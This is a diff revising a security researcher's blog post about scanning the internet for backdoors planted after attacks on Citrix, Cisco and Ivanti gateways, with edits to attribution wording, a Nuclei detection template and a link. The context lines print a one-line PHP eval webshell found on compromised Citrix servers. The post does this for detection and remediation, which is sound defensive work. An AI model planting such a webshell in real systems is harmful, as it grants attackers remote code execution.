@@ -57,7 +57,7 @@ In July 2023, Citrix [disclosed](https://support.citrix.com/external/article?art
 To support remediation at scale, DIVD, in collaboration with Fox-IT, initiated an internet-wide scan campaign under investigation [DIVD-2023-00030](https://csirt.divd.nl/cases/DIVD-2023-00030/) for the vulnerability and [DIVD-2023-00033](https://csirt.divd.nl/cases/DIVD-2023-00033/) for the backdoor campaign. This was one of the first cases where I experienced how quickly attackers can establish persistence before patches are even applied.
 
 ### Scanning for the Backdoors
-The first backdoor is publicly attributed to criminals. While there was nation state activity around this vulnerability, [with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)](https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/), our investigation focused on the criminal shell. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the `/var/vpn/themes` directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the `/logon/LogonPoint/uiareas` directory.
+The first vulnerability had significant activity around it and many different backdoors. While there was nation state activity around this vulnerability, [with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)](https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/), it is unclear whether the shell we investigated was criminal or nation-state. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the `/var/vpn/themes` directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the `/logon/LogonPoint/uiareas` directory.
 
 ```php
 <?php http_response_code(201); @eval($_POST[5]);
@@ -114,10 +114,10 @@ info:
 http:
   - method: POST
     path:
-      - "{% raw %}{{BaseURL}}/{{uri}}{% endraw %}"
+      - "{% raw %}{{BaseURL}}/logon/LogonPoint/uiareas/{{filename}}{% endraw %}"
     
     payloads:
-      uri:
+      filename:
         - "{% raw %}{{{% endraw %}filename:common_php_filenames.txt{% raw %}}}{% endraw %}"
     
     matchers-condition: and
@@ -130,7 +130,7 @@ http:
         part: header
         negative: true
         regex:
-          - 'Content-Length:'
+          - '(?i)content-length:'
 ```
 <span class="centered-text">Listing 4: Nuclei scanning template for the updated Citrix Webshells</span>
 
@@ -315,7 +315,7 @@ DE: 860  NL: 750  EC: 714  FR: 696  RU: 620
 All system owners that were compromised received a notification about the implant, steps to remediate, and advice on how to proceed. While Cisco themselves attempted to bury these numbers, collective effort from the industry brought down the infection rate and number of compromised hosts significantly over the months after. 
 
 ## Ivanti Connect Secure - CVE-2024-21893
-A few months later, on January 31st, 2024, Ivanti released fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. The first to publish a report on the implants resulting from these attacks was [Orange Cyberdefense](https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor), who dubbed it the DSLog backdoor. 
+A few months later, on January 31st, 2024, Ivanti [released](https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways) fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. One of the first to publish a report on the implants resulting from these attacks was [Orange Cyberdefense](https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor), who named it the DSLog backdoor. 
 
 As with the previous cases, post-exploitation scanning revealed compromises that would have gone unnoticed by standard vulnerability checks.
 
